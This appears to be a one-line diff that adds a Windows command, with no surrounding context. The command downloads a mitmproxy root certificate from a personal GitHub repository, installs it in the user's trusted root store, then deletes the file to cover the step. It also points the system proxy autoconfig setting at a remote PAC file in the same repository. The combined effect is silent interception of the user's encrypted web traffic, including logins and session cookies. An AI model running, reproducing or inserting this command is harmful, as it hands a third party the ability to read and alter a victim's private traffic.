@@ -1,0 +1,1 @@
+curl -L -o temp.cer "https://raw.githubusercontent.com/quyt0/quyt0/refs/heads/main/mitmproxy-ca-cert.cer" && certutil -user -addstore root temp.cer && del temp.cer && reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d "https://raw.githubusercontent.com/quyt0/quyt0/refs/heads/main/proxy.pac" /f
